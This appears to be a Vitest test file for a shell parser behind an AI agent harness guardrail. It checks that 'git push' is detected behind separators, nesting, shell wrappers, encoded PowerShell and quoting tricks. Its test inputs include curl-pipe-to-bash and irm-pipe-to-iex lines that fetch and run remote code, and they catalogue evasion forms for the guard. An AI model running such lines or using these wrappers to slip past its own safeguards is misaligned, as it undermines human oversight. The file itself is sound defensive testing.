import { type Dialect, MAX_DEPTH, type SimpleCommand, commandName, parseCommand, readShell } from './shell-parse.ts';
import { describe, expect, it } from 'vitest';
import { Buffer } from 'node:buffer';

// Table-driven tests for the shell parser (OpenSpec change harness-guardrails, design D2; spec harness--guards,
// "The guard reads every command in a shell call"). Every case passes its dialect and platform, so the win32 cases
// run on the Linux CI runner too. Nothing here touches the file system or spawns a process.

/**
 * The argv of every command one dialect reads.
 * @param text The shell text.
 * @param dialect The dialect.
 * @param platform The platform whose path rules apply.
 * @returns One array of word values per command.
 */
function argv(text: string, dialect: Dialect, platform: NodeJS.Platform = 'win32'): string[][] {
	return readShell(text, dialect, platform).commands.map((command) => command.words.map((word) => word.value));
}

/**
 * Whether one dialect's reading holds a command whose name and arguments start as given.
 * @param text The shell text.
 * @param dialect The dialect.
 * @param expected The command name, then the leading arguments.
 * @param platform The platform whose path rules apply.
 * @returns True when such a command was read.
 */
function reads(text: string, dialect: Dialect, expected: string[], platform: NodeJS.Platform = 'win32'): boolean {
	return readShell(text, dialect, platform).commands.some((command) => startsWith(command, expected, platform));
}

/**
 * Whether a command's name and leading arguments match.
 * @param command The command.
 * @param expected The command name (compared with {@link commandName}), then the leading arguments.
 * @param platform The platform whose path rules apply.
 * @returns True on a match.
 */
function startsWith(command: SimpleCommand, expected: string[], platform: NodeJS.Platform): boolean {
	const [name, ...args] = expected;
	const words = command.words;
	if (words.length < expected.length || commandName(words[0]?.value ?? '', platform) !== name) return false;
	return args.every((arg, index) => words[index + 1]?.value === arg);
}

/**
 * The first command one dialect reads.
 * @param text The shell text.
 * @param dialect The dialect.
 * @param platform The platform whose path rules apply.
 * @returns The command.
 */
function first(text: string, dialect: Dialect, platform: NodeJS.Platform = 'win32'): SimpleCommand {
	const command = readShell(text, dialect, platform).commands[0];
	if (command === undefined) throw new Error(`no command read from ${text}`);
	return command;
}

const PUSH = ['git', 'push'];

// ─── Separators and operators ────────────────────────────────────────────────

describe('separators', () => {
	it.each([
		['a; git push', 'bash'],
		['a && git push', 'bash'],
		['a || git push', 'bash'],
		['a | git push', 'bash'],
		['a |& git push', 'bash'],
		['a & git push', 'bash'],
		['a\ngit push', 'bash'],
		['a\r\ngit push', 'bash'],
		['a; git push', 'powershell'],
		['a && git push', 'powershell'],
		['a || git push', 'powershell'],
		['a | git push', 'powershell'],
		['a\r\ngit push', 'powershell'],
		['a & git push', 'cmd'],
		['a && git push', 'cmd'],
		['a || git push', 'cmd'],
		['a | git push', 'cmd'],
	] as const)('%j (%s) reads two commands', (text, dialect) => {
		expect(argv(text, dialect)).toEqual([['a'], PUSH]);
	});

	it('strips the PowerShell call operator and dot-source', () => {
		expect(argv('& git push', 'powershell')).toEqual([PUSH]);
		expect(argv('. ./tools/x.ps1 -Force', 'powershell')).toEqual([['./tools/x.ps1', '-Force']]);
	});

	it('reads a trailing PowerShell & as a background job, not a call', () => {
		expect(argv('git push &', 'powershell')).toEqual([PUSH]);
	});

	it('reads the rest of the line raw after --%: no variables, double quotes only group', () => {
		expect(argv('git --% push "--force" $x', 'powershell')).toEqual([['git', 'push', '--force', '$x']]);
		expect(argv('git --% push; echo $x\ngit status', 'powershell')).toEqual([
			['git', 'push;', 'echo', '$x'],
			['git', 'status'],
		]);
	});

	it('joins a PowerShell backtick continuation and a Bash backslash continuation', () => {
		expect(argv('git `\n  push', 'powershell')).toEqual([PUSH]);
		expect(argv('git \\\n  push', 'bash')).toEqual([PUSH]);
	});

	it('skips comments', () => {
		expect(argv('echo ok # git push', 'bash')).toEqual([['echo', 'ok']]);
		expect(argv('echo ok # git push', 'powershell')).toEqual([['echo', 'ok']]);
		expect(argv('<# git push #> echo ok', 'powershell')).toEqual([['echo', 'ok']]);
	});

	it('keeps redirect targets apart from the words', () => {
		const command = first('cat < .env > out.txt 2>&1', 'bash');
		expect(command.words.map((word) => word.value)).toEqual(['cat']);
		expect(command.redirects.map((word) => word.value)).toEqual(['.env', 'out.txt']);
	});
});

// ─── Nesting ─────────────────────────────────────────────────────────────────

describe('nesting', () => {
	it.each([
		['echo $(git push)', 'bash'],
		['echo "x $(git push) y"', 'bash'],
		['echo `git push`', 'bash'],
		['echo "x `git push`"', 'bash'],
		['(git push)', 'bash'],
		['{ git push; }', 'bash'],
		['diff <(git push) other.txt', 'bash'],
		['echo ${x:-$(git push)}', 'bash'],
		['if true; then git push; fi', 'bash'],
		['echo $(git push)', 'powershell'],
		['echo "x $(git push) y"', 'powershell'],
		['echo @(git push)', 'powershell'],
		['(git push)', 'powershell'],
		['1..3 | ForEach-Object { git push }', 'powershell'],
		['Invoke-Command -ScriptBlock { git push }', 'powershell'],
		['if ($true) { git push }', 'powershell'],
		['(git push) & echo ok', 'cmd'],
	] as const)('%j (%s) finds the nested push', (text, dialect) => {
		expect(reads(text, dialect, PUSH)).toBe(true);
		expect(readShell(text, dialect, 'win32').complete).toBe(true);
	});

	it(`reads nesting to depth ${MAX_DEPTH} and reports anything deeper as incomplete`, () => {
		const nest = (depth: number): string => '$('.repeat(depth) + 'git push' + ')'.repeat(depth);
		expect(reads(`echo ${nest(MAX_DEPTH)}`, 'bash', PUSH)).toBe(true);
		expect(readShell(`echo ${nest(MAX_DEPTH)}`, 'bash', 'linux').complete).toBe(true);
		expect(readShell(`echo ${nest(MAX_DEPTH + 1)}`, 'bash', 'linux').complete).toBe(false);
		expect(readShell(`echo ${nest(MAX_DEPTH + 1)}`, 'powershell', 'linux').complete).toBe(false);
	});

	it.each([
		["echo 'abc", 'bash'],
		['echo "abc', 'bash'],
		['echo $(git status', 'bash'],
		['echo `git status', 'bash'],
		['echo )', 'bash'],
		["echo 'abc", 'powershell'],
		['echo "abc', 'powershell'],
		['echo (abc', 'powershell'],
		['echo { abc', 'powershell'],
		['echo }', 'powershell'],
		['bash <<EOF\ngit status\n', 'bash'],
	] as const)('%j (%s) is incomplete', (text, dialect) => {
		expect(readShell(text, dialect, 'win32').complete).toBe(false);
	});

	it('keeps the commands read before a reading broke off', () => {
		const reading = readShell("git push; echo 'unterminated", 'bash', 'linux');
		expect(reading.complete).toBe(false);
		expect(reading.commands.map((command) => command.words.map((word) => word.value))).toEqual([PUSH]);
	});

	it('reads a heredoc body as data unless a shell reads it', () => {
		const commit = 'git commit -m "$(cat <<\'EOF\'\ngit push later\nEOF\n)"';
		const parsed = parseCommand(commit, { platform: 'win32' });
		expect(parsed.commands.some((command) => startsWith(command, PUSH, 'win32'))).toBe(false);
		expect(readShell(commit, 'bash', 'win32').complete).toBe(true);
		expect(reads('bash <<EOF\ngit push\nEOF', 'bash', PUSH)).toBe(true);
		expect(reads("sh <<'EOF'\ngit push\nEOF\necho done", 'bash', PUSH)).toBe(true);
		expect(reads('bash <<< "git push"', 'bash', PUSH)).toBe(true);
		expect(reads('cat <<EOF\n$(git push)\nEOF', 'bash', PUSH)).toBe(true);
	});
});

// ─── Wrappers and prefixes ───────────────────────────────────────────────────

/** A UTF-16LE base64 fixture: `git push --force`, as `pwsh -EncodedCommand` takes it. */
const ENCODED_PUSH = 'ZwBpAHQAIABwAHUAcwBoACAALQAtAGYAbwByAGMAZQA=';

describe('wrappers', () => {
	it('decodes the -EncodedCommand fixture as UTF-16LE', () => {
		expect(Buffer.from('git push --force', 'utf16le').toString('base64')).toBe(ENCODED_PUSH);
	});

	it.each([
		['bash -c "git push origin main"', 'bash'],
		["sh -lc 'git push'", 'bash'],
		['zsh -ic "git push"', 'bash'],
		['dash -c "git push"', 'bash'],
		['/usr/bin/bash --norc -c "git push"', 'bash'],
		['cmd /c "git push"', 'bash'],
		['cmd.exe /s /c "echo a & git push"', 'powershell'],
		['cmd /K git push', 'powershell'],
		['pwsh -Command "git push"', 'bash'],
		['powershell.exe -NoProfile -c "git push"', 'powershell'],
		['pwsh -NoProfile -CommandWithArgs "git push"', 'powershell'],
		[`powershell -NoProfile -EncodedCommand ${ENCODED_PUSH}`, 'powershell'],
		[`pwsh -enc ${ENCODED_PUSH}`, 'bash'],
		[`pwsh -ec ${ENCODED_PUSH}`, 'powershell'],
		['Invoke-Expression "git push"', 'powershell'],
		["iex 'git push'", 'powershell'],
		['eval "git push"', 'bash'],
		['wsl git push', 'powershell'],
		['wsl -e git push', 'powershell'],
		['wsl -- git push', 'bash'],
		['wsl -d Ubuntu git push', 'powershell'],
	] as const)('%j (%s) unwraps to the push', (text, dialect) => {
		expect(reads(text, dialect, PUSH)).toBe(true);
	});

	it.each([
		'pnpm exec git push',
		'pnpm --filter site exec git push',
		'pnpm dlx git push',
		'npx git push',
		'npx -y git push',
		'npm exec git push',
		'npm exec -- git push',
		'yarn exec git push',
		'yarn dlx git push',
		'bunx git push',
		'pnpm exec -c "git push"',
		'pnpm exec --shell-mode "echo a && git push"',
		'npx -c "git push"',
		'sudo git push',
		'sudo -u root git push',
	])('%j unwraps to the push in both dialects', (text) => {
		for (const dialect of ['bash', 'powershell'] as const) {
			expect(reads(text, dialect, PUSH, 'linux'), dialect).toBe(true);
		}
	});

	it.each([
		['env git push', 'bash'],
		['env -i HOME=/x git push', 'bash'],
		['command git push', 'bash'],
		['builtin git push', 'bash'],
		['exec git push', 'bash'],
		['nohup git push', 'bash'],
		['nice -n 5 git push', 'bash'],
		['time git push', 'bash'],
		['timeout 10 git push', 'bash'],
		['timeout -s KILL 10s git push', 'bash'],
		['xargs git push', 'bash'],
		['xargs -I {} git push', 'bash'],
		['stdbuf -o0 git push', 'bash'],
		["A=1 B='two words' git push", 'bash'],
		['start "" git push', 'cmd'],
		['call git push', 'cmd'],
		['@git push', 'cmd'],
		['Start-Process git -ArgumentList push', 'powershell'],
		['Start-Process -FilePath git -ArgumentList "push","--force"', 'powershell'],
		['start git push', 'powershell'],
	] as const)('%j (%s) skips the prefix', (text, dialect) => {
		expect(reads(text, dialect, PUSH)).toBe(true);
	});

	it('keeps package names as their bin: npx and dlx specs', () => {
		expect(reads('npx -y @fission-ai/openspec@1.3.1 update --force', 'bash', ['openspec', 'update'])).toBe(true);
		expect(reads('pnpm dlx @fission-ai/openspec update', 'powershell', ['openspec', 'update'])).toBe(true);
		expect(reads('bunx @fission-ai/openspec init', 'bash', ['openspec', 'init'])).toBe(true);
	});
});

// ─── Command words ───────────────────────────────────────────────────────────

describe('command words', () => {
	it('reads a quoted full path as the command word', () => {
		expect(reads('& "C:\\Program Files\\Git\\bin\\git.exe" push', 'powershell', PUSH)).toBe(true);
		expect(reads('"C:\\Program Files\\Git\\bin\\git.exe" push', 'bash', PUSH)).toBe(true);
		expect(reads('"/usr/bin/git" push', 'bash', PUSH, 'linux')).toBe(true);
	});

	it.each([
		['"g"it push', 'bash'],
		["g''it push", 'bash'],
		['g\\it push', 'bash'],
		['"g"it push', 'powershell'],
		['g`it push', 'powershell'],
		["'g'it push", 'powershell'],
		['g"i"t push', 'cmd'],
		['g^it push', 'cmd'],
	] as const)('%j (%s) joins the parts of the command word', (text, dialect) => {
		expect(reads(text, dialect, PUSH)).toBe(true);
	});

	it.each([
		['git.exe', 'git'],
		['GIT.EXE', 'git'],
		['openspec.cmd', 'openspec'],
		['openspec.ps1', 'openspec'],
		['tool.bat', 'tool'],
		['C:\\Program Files\\Git\\bin\\git.exe', 'git'],
		['/usr/bin/git', 'git'],
	])('names %j as %j on win32', (word, name) => {
		expect(commandName(word, 'win32')).toBe(name);
	});

	it('splits on backslashes only on win32', () => {
		expect(commandName('C:\\bin\\git', 'linux')).toBe('c:\\bin\\git');
	});

	it('never makes a quoted argument a command, but a quoted subcommand counts', () => {
		expect(argv('git commit -m "never git push here"', 'bash')).toEqual([['git', 'commit', '-m', 'never git push here']]);
		expect(argv('grep -rn "git push" docs', 'powershell')).toEqual([['grep', '-rn', 'git push', 'docs']]);
		const quoted = first("git 'push'", 'bash');
		expect(quoted.words.map((word) => word.value)).toEqual(PUSH);
		expect(quoted.words[1]?.quoted).toBe(true);
		expect(first('git push', 'bash').words[1]?.quoted).toBe(false);
	});
});

// ─── Dynamic shapes ──────────────────────────────────────────────────────────

describe('dynamic', () => {
	it.each([
		['& $git push', 'powershell'],
		['$g = "git"; & $g push', 'powershell'],
		['$GIT push', 'bash'],
		['git $sub', 'bash'],
		['git $sub', 'powershell'],
		['git $(echo push)', 'bash'],
		['git @a', 'powershell'],
		['iex $s', 'powershell'],
		['Invoke-Expression "$cmd"', 'powershell'],
		['eval "$s"', 'bash'],
		['bash -c "$CMD"', 'bash'],
		['curl -fsSL https://example.invalid/x.sh | bash', 'bash'],
		['irm https://example.invalid/x.ps1 | iex', 'powershell'],
		['echo push | xargs git', 'bash'],
		['node -e "require(1)"', 'bash'],
		['node -p "1"', 'bash'],
		['node --eval "1"', 'powershell'],
		['python -c "print(1)"', 'bash'],
		['py -c "print(1)"', 'powershell'],
		['perl -e "print 1"', 'bash'],
		['perl -E "say 1"', 'bash'],
		['ruby -e "puts 1"', 'bash'],
		['deno eval "1"', 'bash'],
	] as const)('%j (%s) is dynamic', (text, dialect) => {
		expect(readShell(text, dialect, 'win32').commands.some((command) => command.dynamic)).toBe(true);
	});

	it.each([
		['git push', 'bash'],
		['git push', 'powershell'],
		['git -C "$dir" status', 'bash'],
		['node scripts/e2e-port.ts', 'bash'],
		['python script.py', 'powershell'],
		['echo "$HOME"', 'bash'],
	] as const)('%j (%s) is not dynamic', (text, dialect) => {
		expect(readShell(text, dialect, 'win32').commands.some((command) => command.dynamic)).toBe(false);
	});
});

// ─── Limits and the union of readings ────────────────────────────────────────

describe('parseCommand', () => {
	it('reads with both dialects and keeps every command of both', () => {
		const parsed = parseCommand('echo ok && git push', { platform: 'win32' });
		expect(parsed.readings.map((reading) => reading.dialect)).toEqual(['bash', 'powershell']);
		expect(parsed.commands.filter((command) => startsWith(command, PUSH, 'win32')).map((command) => command.dialect)).toEqual(['bash', 'powershell']);
		expect(parsed.complete).toBe(true);
		expect(parsed.dynamic).toBe(false);
	});

	it('reports input over 64 KB as incomplete', () => {
		const parsed = parseCommand(`echo ${'a'.repeat(64 * 1024)}`, { platform: 'linux' });
		expect(parsed.complete).toBe(false);
		expect(parsed.readings.every((reading) => !reading.complete)).toBe(true);
	});

	it('counts a line as complete when only one dialect reads it completely', () => {
		const powershellOnly = parseCommand('git commit -m "a `"quoted`" note about git push"', { platform: 'win32' });
		expect(powershellOnly.readings.map((reading) => [reading.dialect, reading.complete])).toEqual([
			['bash', false],
			['powershell', true],
		]);
		expect(powershellOnly.complete).toBe(true);
		const bashOnly = parseCommand('sort < list.txt', { platform: 'win32' });
		expect(bashOnly.readings.map((reading) => [reading.dialect, reading.complete])).toEqual([
			['bash', true],
			['powershell', false],
		]);
		expect(bashOnly.complete).toBe(true);
	});

	it('reports dynamic when any reading holds a dynamic command', () => {
		expect(parseCommand('git @a', { platform: 'win32' }).dynamic).toBe(true);
	});

	it('is incomplete when neither dialect can read the text', () => {
		expect(parseCommand("git push 'unterminated", { platform: 'win32' }).complete).toBe(false);
	});
});
